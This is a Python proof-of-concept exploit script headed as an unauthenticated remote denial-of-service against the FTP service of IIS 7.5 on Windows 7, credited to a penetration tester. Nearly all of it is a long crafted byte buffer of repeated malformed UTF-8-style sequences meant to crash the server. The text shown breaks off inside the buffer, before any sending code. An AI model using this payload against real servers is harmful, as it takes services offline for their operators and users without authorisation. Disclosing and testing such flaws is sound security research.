	
import socket, sys
print "\n" 
print "----------------------------------------------------------------"
print "|      Windows 7 IIS7.5 FTPSVC UNAUTH'D REMOTE DOS POC          |"
print "|      Matthew Bergin, Bergin Penetration Testing               |"
print "|       Win7 Ultimate v6.1 build 7600, IIS 7.5.7600.16385                     |"
print "----------------------------------------------------------------"
print "\n"
buf=("\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef"
"\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83"
"\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0"
"\xef\x83\xb0\xef\x83\xb0\x31\x34\x34\x39\x38\xef\xbb\xbf\xff\xef"
"\xfe\xff\xff\xef\xff\xef\xff\xef\xef\xbb\xbf\xfe\xff\xff\xef\xef"
"\xbb\xbf\xfe\xff\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xff"
"\xef\xff\xef\xff\xef\xff\xef\xfe\xff\xef\xbb\xbf\xff\xef\xef\xbb"
"\xbf\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xfe\xff"
"\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xff\xef\xff\xef\xfe\xff"
"\xff\xef\xfe\xff\xfe\xff\xef\xbb\xbf\xff\xef\xfe\xff\xff\xef\xff"
"\xef\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xff\xef"
"\xfe\xff\xff\xef\xff\xef\xff\xef\xff\xef\xef\xbb\xbf\xfe\xff\xef"
"\xbb\xbf\xef\xbb\xbf\xff\xef\xff\xef\xff\xef\xff\xef\xff\xef\xfe"
"\xff\xfe\xff\xfe\xff\xfe\xff\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xff"
"\xef\xff\xef\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xff\xef"
"\xef\xbb\xbf\xfe\xff\xfe\xff\xff\xef\xff\xef\xfe\xff\xfe\xff\xef"
"\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xff\xef"
"\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xff\xef"
"\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xef\xbb"
"\xbf\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xff\xef"
"\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xff\xef\xef\xbb\xbf\xfe"
"\xff\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xfe"
"\xff\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xfe\xff"
"\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xff\xef\xfe\xff\xff\xef"
"\xff\xef\xfe\xff\xff\xef\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xef\xbb"
"\xbf\xef\xbb\xbf\xff\xef\xff\xef\xfe\xff\xfe\xff\xef\xbb\xbf\xff"
"\xef\xfe\xff\xfe\xff\xff\xef\xef\xbb\xbf\xfe\xff\xfe\xff\xef\xbb"
"\xbf\xff\xef\xef\xbb\xbf\xff\xef\xfe\xff\xef\xbb\xbf\xfe\xff\xef"
"\xbb\xbf\xfe\xff\xff\xef\xfe\xff\xff\xef\xfe\xff\xfe\xff\xef\xbb"
"\xbf\xff\xef\xff\xef\xfe\xff\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xef"
"\xbb\xbf\xff\xef\xfe\xff\xff\xef\xff\xef\xfe\xff\xfe\xff\xfe\xff"
"\xfe\xff\xef\xbb\xbf\xff\xef\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xfe"
"\xff\xff\xef\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb"
"\xbf\xef\xbb\xbf\xfe\xff\xfe\xff\xff\xef\xef\xbb\xbf\xff\xef\xff"
"\xef\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xef\xbb"
"\xbf\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xfe\xff\xfe\xff\xef\xbb\xbf"
"\xef\xbb\xbf\xfe\xff\xff\xef\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xef"
"\xbb\xbf\xfe\xff\xff\xef\xfe\xff\xff\xef\xef\xbb\xbf\xfe\xff\xff"
"\xef\xff\xef\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xef\xbb\xbf"
"\xff\xef\xfe\xff\xfe\xff\xff\xef\xff\xef\xfe\xff\xef\xbb\xbf\xff"
"\xef\xff\xef\xff\xef\xff\xef\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xfe"
"\xff\xef\xbb\xbf\xff\xef\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xfe\xff"
"\xef\xbb\xbf\xff\xef\xff\xef\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xef"
"\xbb\xbf\xfe\xff\xef\xbb\xbf\xff\xef\xfe\xff\xef\xbb\xbf\xff\xef"
"\xff\xef\xfe\xff\xfe\xff\xff\xef\xff\xef\xef\xbb\xbf\xfe\xff\xff"
"\xef\xef\xbb\xbf"
"\xff\xef\xff\xef\xff\xef\xfe\xff\xfe\xff\xef\xbb\xbf\xff\xef\xef"
"\xbb\xbf\xff\xef\xef\xbb\xbf\xff\xef\xfe\xff\xff\xef\xef\xbb\xbf"
"\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xfe\xff\xfe\xff\xff\xef\xfe\xff"
"\xfe\xff\xff\xef\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xef"
"\xbb\xbf\xef\xbb\xbf\xfe\xff\xff\xef\xef\xbb\xbf\xfe\xff\xff\xef"
"\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xfe\xff"
"\xfe\xff\xff\xef\xfe\xff\xef\xbb\xbf\xff\xef\xff\xef\xfe\xff\xff"
"\xef\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xff"
"\xef\xff\xef\xef\xbb\xbf\xfe\xff\xfe\xff\xff\xef\xff\xef\xff\xef"
"\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xff\xef\xfe\xff\xff\xef"
"\xff\xef\xfe\xff\xff\xef\xfe\xff\xfe\xff\xfe\xff\xff\xef\xfe\xff"
"\xfe\xff\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xff\xef\xef\xbb"
"\xbf\xff\xef\xfe\xff\xef\xbb\xbf\xff\xef\xff\xef\xef\xbb\xbf\xff"
"\xef\xfe\xff\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xff\xef"
"\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xff\xef\xfe\xff\xfe\xff\xff\xef"
"\xff\xef\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xfe\xff\xfe\xff\xef\xbb"
"\xbf\xfe\xff\xfe\xff\xfe\xff\xfe\xff\xff\xef\xef\xbb\xbf\xef\xbb"
"\xbf\xff\xef\xfe\xff\xfe\xff\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xef"
"\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xff\xef\xff\xef\xfe\xff"
"\xff\xef\xfe\xff\xef\xbb\xbf\xfe\xff\xfe\xff\xfe\xff\xef\xbb\xbf"
"\xff\xef\xff\xef\xef\xbb\xbf\xff\xef\xff\xef\xfe\xff\xff\xef\xfe"
"\xff\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef"
"\xbb\xbf\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xff\xef\xff\xef\xfe\xff"
"\xff\xef\xfe\xff\xfe\xff\xfe\xff\xfe\xff\xfe\xff\xef\xbb\xbf\xfe"
"\xff\xfe\xff\xfe\xff\xef\xbb\xbf\xfe\xff\xff\xef\xff\xef\xef\xbb"
"\xbf\xfe\xff\xfe\xff\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xff"
"\xef\xff\xef\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xff\xef\xff\xef\xfe"
"\xff\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xff"
"\xef\xff\xef\xff\xef\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf"
"\xfe\xff\xff\xef\xfe\xff\xfe\xff\xef\xbb\xbf\xff\xef\xfe\xff\xfe"
"\xff\xff\xef\xef\xbb\xbf\xff\xef\xff\xef\xfe\xff\xfe\xff\xfe\xff"
"\xff\xef\xff\xef\xff\xef\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xff\xef"
"\xfe\xff\xff\xef\xfe\xff\xff\xef\xfe\xff\xfe\xff\xfe\xff\xff\xef"
"\xfe\xff\xff\xef\xfe\xff\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xff\xef"
"\xff\xef\xff\xef\xfe\xff\xff\xef\xfe\xff\xfe\xff\xff\xef\xfe\xff"
"\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xef\xbb\xbf"
"\xff\xef\xef\xbb\xbf\xff\xef\xfe\xff\xfe\xff\xfe\xff\xef\xbb\xbf"
"\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xff\xef\xfe"
"\xff\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xff\xef\xfe\xff"
"\xff\xef\xfe\xff\xff\xef\xfe\xff\xfe\xff\xff\xef\xef\xbb\xbf\xef"
"\xbb\xbf\xfe\xff\xff\xef\xef\xbb\xbf\xfe\xff\xfe\xff\xfe\xff\xfe"
"\xff\xfe\xff\xff\xef\xff\xef\xff\xef\xfe\xff\xfe\xff\xef\xbb\xbf"
"\xff\xef\xfe\xff\xfe\xff\xef\xbb\xbf\xff\xef\xfe\xff\xef\xbb\xbf"
"\xff\xef\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xff\xef\xff\xef"
"\xef\xbb\xbf\xff\xef\xfe\xff\xff\xef\xfe\xff\xef\xbb\xbf\xef\xbb"
"\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf"
"\xfe\xff\xef\xbb\xbf\xff\xef\xff\xef\xfe\xff\xff\xef\xef\xbb\xbf"
"\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xfe\xff\xfe\xff\xff\xef\xef\xbb"
"\xbf\xef\xbb\xbf\xfe\xff\xff\xef\xef\xbb\xbf\xfe\xff\xfe\xff\xfe"
"\xff\xef\xbb\xbf\xff\xef\xfe\xff\xfe\xff\xff\xef\xef\xbb\xbf\xef"
"\xbb\xbf\xff\xef\xfe\xff\xff\xef\xff\xef\xff\xef\xff\xef\xef\xbb"
"\xbf\xff\xef\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xff\xef"
"\xef\xbb\xbf\xfe\xff\xff\xef\xff\xef\xff\xef\xef\xbb\xbf\xef\xbb"
"\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xef"
"\xbb\xbf\xfe\xff\xfe\xff\xfe\xff\xff\xef\xef\xbb\xbf\xfe\xff\xef"
"\xbb\xbf\xfe\xff\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xef\xbb"
"\xbf\xef\xbb\xbf\xff\xef\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xef\xbb"
"\xbf\xfe\xff\xff\xef\xff\xef\xfe\xff\xfe\xff\xfe\xff\xfe\xff\xef"
"\xbb\xbf\xff\xef\xff\xef\xfe\xff\xff\xef\xef\xbb\xbf\xef\xbb\xbf"
"\xef\xbb\xbf\xff\xef\xfe\xff\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xff"
"\xef\xff\xef\xfe\xff\xef\xbb\xbf\xff\xef\xfe\xff\xfe\xff\xef\xbb"
"\xbf\xff\xef\xef\xbb\xbf\xff\xef\xfe\xff\xfe\xff\xff\xef\xff\xef"
"\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xff\xef\xff\xef\xfe\xff\xef\xbb"
"\xbf\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xef\xbb"
"\xbf\xff\xef\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xfe\xff\xff\xef\xfe"
"\xff\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xef\xbb"
"\xbf\xff\xef\xfe\xff\xfe\xff\xff\xef\xfe\xff\xef\xbb\xbf\xff\xef"
"\xfe\xff\xef\xbb\xbf\xfe\xff\xff\xef\xff\xef\xfe\xff\xff\xef\xef"
"\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xfe\xff"
"\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xfe\xff"
"\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xff\xef\xff\xef\xfe\xff\xfe\xff"
"\xef\xbb\xbf\xfe\xff\xfe\xff\xfe\xff\xfe\xff\xfe\xff\xfe\xff\xff"
"\xef\xfe\xff\xff\xef\xff\xef\xff\xef\xff\xef\xfe\xff\xfe\xff\xef"
"\xbb\xbf\xff\xef\xff\xef\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xff\xef"
"\xfe\xff\xef\xbb\xbf\xff\xef\xfe\xff\xff\xef\xef\xbb\xbf\xff\xef"
"\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xfe\xff\xef\xbb\xbf\xef\xbb\xbf"
"\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xfe\xff\xff\xef\xef\xbb\xbf\xef"
